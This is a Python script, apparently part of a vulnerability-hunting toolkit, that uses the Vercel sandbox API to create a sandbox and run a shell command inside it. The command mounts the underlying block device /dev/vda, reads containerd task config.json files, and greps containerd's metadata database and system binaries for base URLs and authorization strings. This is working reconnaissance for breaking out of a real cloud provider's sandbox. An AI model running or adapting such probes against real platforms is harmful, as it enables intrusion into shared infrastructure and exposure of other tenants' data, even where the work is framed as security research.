# -*- coding: utf-8 -*-
"""v64r 取证: task config.json + meta.db 字符串 + cell 二进制"""
import sys, os, time, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

NAME = 'v64r'
sid = None


def main():
    global sid
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    time.sleep(2)
    c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME}, timeout=120)
    print('[create]', c, r[:200])
    if c != 200:
        raise SystemExit('create failed')
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(2)
    s = ('mkdir -p /mnt/vdax; sudo mount /dev/vda /mnt/vdax 2>&1; '
         'echo ===OPT_VERCEL===; ls -laR /mnt/vdax/opt/vercel/ 2>&1 | head -40; '
         'echo ===TASKS===; ls /mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/ 2>&1; '
         'T=$(ls /mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/ 2>/dev/null | head -1); '
         'echo ===CONFIG===; head -c 6000 /mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/$T/config.json 2>&1; '
         'echo; echo ===GREP_DB1===; grep -a -o "base_url[^\\\\\\"]*" /mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db 2>/dev/null | head -20; '
         'echo ===GREP_DB2===; grep -a -o "BASE_URL[^\\\\\\"]*" /mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db 2>/dev/null | head -20; '
         'echo ===GREP_DB3===; grep -a -o "authorized[^\\\\\\"]*" /mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db 2>/dev/null | head -20; '
         'echo ===GREP_CELL===; grep -rla "vercel.hive.cell" /mnt/vdax/opt /mnt/vdax/usr /mnt/vdax/sbin /mnt/vdax/bin 2>/dev/null | head -10; '
         'echo ===GREP_NOT_AUTH===; grep -rla "not authorized" /mnt/vdax/opt /mnt/vdax/usr /mnt/vdax/sbin /mnt/vdax/bin 2>/dev/null | head -10')
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c", s], "wait": True, "logs": True, "timeout": 90000},
               timeout=130)
    print('[cmd]', c)
    print((r or '')[:20000])
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED')


if __name__ == '__main__':
    main()
